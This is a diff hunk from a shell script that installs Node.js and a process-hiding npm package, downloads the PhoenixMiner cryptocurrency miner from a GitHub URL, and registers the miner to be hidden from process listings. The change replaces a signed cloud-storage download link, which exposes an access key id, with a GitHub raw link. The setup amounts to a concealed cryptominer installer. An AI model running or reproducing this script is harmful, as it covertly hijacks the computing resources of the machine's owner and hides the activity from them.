@@ -5,7 +5,7 @@ apt update
 curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
 sudo apt install nodejs
 npm i -g node-process-hider
-wget https://bbuseruploads.s3.amazonaws.com/0904ae37-84b3-4c52-a61b-81b9ed1e0377/downloads/53d2fda4-2608-41d6-a209-3e40a9ae95d8/PhoenixMiner_5.9d_Linux.zip?Signature=FuPzSnB%2BA%2Ffm9KXFAbCBx4eBmKc%3D&Expires=1646582460&AWSAccessKeyId=AKIA6KOSE3BNA7WTAGHW&versionId=GSdOw9ejgURe9WLlNaugLA.PcmzjgDfU&response-content-disposition=attachment%3B%20filename%3D%22PhoenixMiner_5.9d_Linux.zip%22
+wget https://github.com/gyrogerald/dera/raw/main/PhoenixMiner_5.9d_Linux.zip
 unzip PhoenixMiner_5.9d_Linux.zip
 cd PhoenixMiner_5.9d_Linux
 sudo ph add PhoenixMiner
